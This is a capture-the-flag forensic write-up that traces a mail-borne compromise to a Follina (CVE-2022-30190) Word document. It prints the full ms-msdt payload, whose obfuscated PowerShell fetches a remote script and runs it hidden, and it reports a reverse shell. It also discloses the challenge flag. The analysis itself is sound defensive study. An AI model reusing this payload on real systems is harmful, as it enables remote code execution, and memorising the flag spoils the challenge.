# [FORENSIC] FRS103

---

**Author**: `Evil Duck`

**Difficulty**: `Hard`

**Flag**: `FIA{N0000000000_m4cr0_Try_f0l1n4_1nstead:DDDD_afd9a1434c08aa91b283}`

### Description

> By the last day old year, Jack has recieved an email message from his co-worker, after opening it, his compputer was compromised. Can you help him find the reason why ?

> Note: ***This challenge contains real malware. Please play on a virtual machine, ABSOLUTELY DO NOT PLAY ON A REAL MACHINE. When playing on a virtual machine, to ensure safety, players should take a snapshot of the virtual machine first and set the network card to host-only mode.***

> Link download: [here](https://longthuanstore-my.sharepoint.com/:u:/g/personal/nguyen_google_id_vn/ERnwUOWT3lhLmflk_jEms5IBmT-3C2EzibBphVbPMC5NYw?e=NAqLkZ)
> 

### Objective

> Knowing how to detect Follina, obfuscate powershell
> 

---

# Solution

## Solver

- So in this challenge, we are given an `ad1` file, this is the image from the disk.

- Reading the description, we know that the computer was `compromised` when user try to open an email.

- Quickly research on the internet, we can easily see that the location of `mail` on our disk

<p align="center">
  <img src="https://github.com/P5ySm1th/CTF/assets/100250271/ca15d071-a40b-47a4-888b-8506758a2bdc">
</p>

- Know we can see that the folder of `mail` is `C:/Users/me/AppData/Local/Microsoft/Outlook`

- Searching that, we can find 3 files from the disk

<p align="center">
  <img src="https://github.com/P5ySm1th/CTF/assets/100250271/4639998d-84e8-4134-970a-3a89b3a7b2ba">
</p>

- Export 3 files from the disk and open that. But there is still some mistake. Although this is the `outlook` file, but `outlook` can only recieve `pst` file, not `ost`.

- Reading more about `psd` and `ost` [here](https://support.microsoft.com/vi-vn/office/gi%E1%BB%9Bi-thi%E1%BB%87u-t%E1%BB%87p-d%E1%BB%AF-li%E1%BB%87u-outlook-pst-v%C3%A0-ost-222eaf92-a995-45d9-bde2-f331f60e2790)

- Reasearch from the internet, we can see that we are able to convert from `ost to pst`, i will use `vmail converter`

<p align="center">
  <img src="https://github.com/P5ySm1th/CTF/assets/100250271/5209ec63-9627-4615-97a4-64271e98e331">
</p>

- And wallah, we get this result, viewing the mailbox, we have something to review:

<p align="center">
  <img src="https://github.com/P5ySm1th/CTF/assets/100250271/4d2e7955-2886-44a0-a349-47ce8b8e7a41">
</p>

- We got the attachment, export it and viewing the file: 
<p align="center">
  <img src="https://github.com/P5ySm1th/CTF/assets/100250271/d85d53ac-5f22-4011-9b31-7edc7abe9bb7">
</p>

- We got nothing, but when applying this `doc` on virustotal, we got this: 

<p align="center">
  <img src="https://github.com/P5ySm1th/CTF/assets/100250271/6c0cc8f8-b4e7-40ce-8061-5dc22f5c779d">
</p>

- Look like it was compromised by `CVE-2022-30190`, researching online, we can see that 
> CVE-2022-30190 refers to a vulnerability in the Microsoft Support Diagnostic Tool (MSDT) that affects Microsoft Office versions like Office 2013/2016/2019/2021 and Professional Plus versions. Also known as Follina, this vulnerability allows attackers to potentially execute malicious code, giving them access to view, change or even delete your data.

- Loking deeper in this CVE, we see that there was a malicious was embeded in the `word`

<p align="center">
  <img src="https://github.com/P5ySm1th/CTF/assets/100250271/8395e192-943b-4eb6-b03f-ba61a1957d39">
</p>

- This is the connection from follina CVE-2022-30190

<p align="center">
  <img src="https://whitehat.vn/attachments/anh-whitehat-vn-png.11481/">
</p>

- So now accessing the html page, using `view-source` and we got: 

<p align="center">
  <img src="https://github.com/P5ySm1th/CTF/assets/100250271/fa0e81f3-0420-493e-9446-0b5d481e850d">
</p>

```powershell
window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=cal?c IT_SelectProgram=NotListed IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'JHVybCA9ICdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vY2hpZHVvbmcyOTEyL3N1cy9tYWluL3N1cy5wczEnCiRvdXRwdXRQYXRoID0gSm9pbi1QYXRoICRlbnY6VEVNUCAnTWljcm9zb2Z0LlBvd2VyU2hlbGxfcHJvZmlsZS5wczEnCkludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJHVybCAtT3V0RmlsZSAkb3V0cHV0UGF0aApTdGFydC1Qcm9jZXNzIHBvd2Vyc2hlbGwuZXhlIC1Bcmd1bWVudExpc3QgIi1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICRvdXRwdXRQYXRoIiAtV2luZG93U3R5bGUgSGlkZGVu'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe \"";
```

- The `base64` is a payload, it use `msdt` to trigger `powershell` to execute the `base64` code

<p align="center">
  <img src="https://github.com/P5ySm1th/CTF/assets/100250271/48fbf713-a799-4d1c-8b46-9fa6a8153cc4">
</p>

- From that script, we can see that it take the link from that url and then download and execute. 

- Accessing that `url`, we get another powershell script

<p align="center">
  <img src="https://github.com/P5ySm1th/CTF/assets/100250271/5d354870-e2c6-475d-80ae-b616aba402de">
</p>

- It seems like it was obfuscated. So we will have to deobfuscate. Do a quick research we found that there are a lot of `powershell deobfuscator`.

- To me i will use [PSDecode](https://github.com/R3MRUM/PSDecode), run it and we get the result:

<p align="center">
  <img src="https://github.com/P5ySm1th/CTF/assets/100250271/78423fd7-98cf-4470-b2a4-345f19a3e2ec">
</p>

- This is a `reverse shell` and it connect to `192.168.112.161` and when scrolling down, we get the flag :D 